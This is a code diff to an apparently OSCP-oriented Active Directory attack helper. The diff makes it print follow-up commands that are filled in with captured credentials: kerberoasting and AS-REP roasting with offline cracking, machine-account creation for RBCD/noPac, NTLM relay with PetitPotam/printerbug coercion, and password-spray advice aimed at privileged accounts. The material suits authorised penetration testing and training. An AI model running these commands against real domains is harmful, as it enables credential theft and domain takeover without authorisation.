@@ -1938,6 +1938,12 @@ class NxcPlus:
             # delegation next-steps) — and don't call a hard error "none found".
             hits = [h for h in self._parse_nxc_findings(stdout)
                     if not _is_nxc_noise(h)]
+            # Every DC has unconstrained delegation by design — its own machine
+            # account is NOT a finding. Drop it so we only flag NON-DC accounts
+            # (the ones that are actually exploitable).
+            if label == "unconstrained delegation" and r.hostname:
+                dcacct = f"{r.hostname}$".lower()
+                hits = [h for h in hits if h.split()[0].lower() != dcacct]
             found[label] = hits
             if hits:
                 print_info("[+]", f"{label}  ({len(hits)}):", indent=1)
@@ -1947,7 +1953,7 @@ class NxcPlus:
                 print_info("[-]", f"{label}: enumeration error (see raw nxc log)", indent=1)
             else:
                 print_info("[*]", f"{label}: none found", indent=1)
-        self._deleg_next_steps(found, dc_ip, r.domain or "domain.local")
+        self._deleg_next_steps(found, dc_ip, r.domain or "domain.local", s)
         print()
 
     @staticmethod
@@ -1974,52 +1980,68 @@ class NxcPlus:
             hits.append(content)
         return hits
 
-    def _deleg_next_steps(self, found: dict, dc_ip: str, domain: str) -> None:
-        """Turn the enrichment findings into concrete follow-up commands."""
+    def _deleg_next_steps(self, found: dict, dc_ip: str, domain: str, s: "Success") -> None:
+        """Turn the enrichment findings into concrete follow-up commands, ordered
+        by what actually gets you to DA on a typical (OSCP) domain: go after the
+        privileged accounts first, roast second, and keep the advanced/exploit
+        chains (noPac/RBCD/relay) clearly marked and last."""
         def has(label):
             return bool(found.get(label))
-        tips = []
-        if has("kerberoastable (SPN) accounts"):
-            tips.append(("roast the SPN accounts (crack offline, no lockout risk)",
-                         f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {domain}/USER:PASS "
-                         f"-outputfile kerb.hash  &&  john --format=krb5tgs kerb.hash --wordlist={WORDLIST}"))
-        if has("AS-REP roastable (no preauth)"):
-            tips.append(("AS-REP roast (no creds needed)",
-                         f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass "
-                         f"-usersfile users.txt  &&  john --format=krb5asrep asrep.hash --wordlist={WORDLIST}"))
-        maq = found.get("MachineAccountQuota") or []
-        maq_val = next((x.split(":")[-1].strip() for x in maq if "Quota" in x), None)
-        if maq_val and maq_val.isdigit() and int(maq_val) > 0:
-            tips.append((f"MachineAccountQuota={maq_val} (>0) — you can add a computer -> RBCD / noPac",
-                         f"impacket-addcomputer {domain}/USER:PASS -dc-ip {dc_ip} "
-                         f"-computer-name 'FAKE$' -computer-pass 'Pass123!'"))
-        unc = [x for x in (found.get("unconstrained delegation") or []) if not x.endswith("$")] \
-              or (found.get("unconstrained delegation") or [])
-        if unc:
-            tips.append(("unconstrained delegation present — coerce auth then capture the TGT",
-                         "impacket-ntlmrelayx / PetitPotam / printerbug against the delegated host"))
+        # real credential filled in (no more USER:PASS placeholder)
+        if s.is_hash:
+            cred, chash = f"{domain}/{s.user}", f" -hashes :{s.secret}"
+        else:
+            cred, chash = f"{domain}/{s.user}:{s.secret}", ""
+
+        primary, advanced = [], []
+
+        # 1) PRIME TARGETS first — the actual goal
         if has("adminCount=1 (protected)"):
-            # Built-ins are always adminCount=1 and are NOT useful targets; the
-            # custom names are the real privesc goals (DA / protected-group members).
             BUILTIN = {"administrator", "krbtgt", "guest", "defaultaccount"}
             allnames = found["adminCount=1 (protected)"]
             targets  = [n for n in allnames if n.split()[0].lower() not in BUILTIN]
             if targets:
-                tips.append((f"PRIME TARGETS — privileged non-default accounts "
-                             f"(adminCount=1): {', '.join(targets[:8])}",
-                             "these are Domain Admins / protected-group members — owning "
-                             "any one = likely domain compromise. Get their creds: password "
-                             "spray, kerberoast, cred reuse from looted hosts, or AS-REP"))
-            else:
-                tips.append((f"adminCount=1 (only built-ins): {', '.join(allnames[:8])}",
-                             "no custom privileged users surfaced — pivot via delegation/MAQ instead"))
-        if not tips:
+                primary.append((f"PRIME TARGETS — privileged non-default accounts: "
+                                f"{', '.join(t.split()[0] for t in targets[:8])}",
+                                "owning ANY one = likely domain compromise. Get their creds: "
+                                "password-spray (no lockout here), cred reuse from looted hosts, "
+                                "hunt SYSVOL/shares/descriptions, or dump a box one logged into"))
+        # 2) roasting (realistic, offline, no lockout)
+        if has("kerberoastable (SPN) accounts"):
+            primary.append(("kerberoast the SPN accounts (crack offline, no lockout risk)",
+                            f"impacket-GetUserSPNs -request -dc-ip {dc_ip} {cred}{chash} "
+                            f"-outputfile kerb.hash  &&  john --format=krb5tgs kerb.hash --wordlist={WORDLIST}"))
+        if has("AS-REP roastable (no preauth)"):
+            primary.append(("AS-REP roast (no creds needed for the roast itself)",
+                            f"impacket-GetNPUsers {domain}/ -dc-ip {dc_ip} -request -no-pass "
+                            f"-usersfile users.txt  &&  john --format=krb5asrep asrep.hash --wordlist={WORDLIST}"))
+
+        # 3) advanced / exploit chains — only real NON-DC findings, clearly flagged
+        unc = found.get("unconstrained delegation") or []   # DC already filtered out upstream
+        if unc:
+            advanced.append(("unconstrained delegation on a NON-DC host — coerce a DC to auth "
+                             f"to it, capture its TGT: {', '.join(u.split()[0] for u in unc[:5])}",
+                             "impacket-ntlmrelayx + PetitPotam/printerbug  (exploit — run manually)"))
+        maq = found.get("MachineAccountQuota") or []
+        maq_val = next((x.split(":")[-1].strip() for x in maq if "Quota" in x), None)
+        if maq_val and maq_val.isdigit() and int(maq_val) > 0:
+            advanced.append((f"MachineAccountQuota={maq_val} — add-computer -> RBCD / noPac "
+                             f"(advanced; rarely the OSCP path)",
+                             f"impacket-addcomputer {cred}{chash} -dc-ip {dc_ip} "
+                             f"-computer-name 'FAKE$' -computer-pass 'Pass123!'"))
+
+        if not primary and not advanced:
             return
         print()
         print_info("[*]", "enrichment — suggested next steps", indent=1)
-        for why, cmd in tips:
+        for why, cmd in primary:
             print(f"      {ORANGE}# {why}{RESET}", flush=True)
             print(f"      {cmd}", flush=True)
+        if advanced:
+            print(f"      {DIM}── advanced / exploit chains (verify, run by hand) ──{RESET}", flush=True)
+            for why, cmd in advanced:
+                print(f"      {DIM}# {why}{RESET}", flush=True)
+                print(f"      {DIM}{cmd}{RESET}", flush=True)
 
     # ── next steps ─────────────────────────────────────────────────────
     def _reuse_cred_set(self, results) -> list[tuple]:
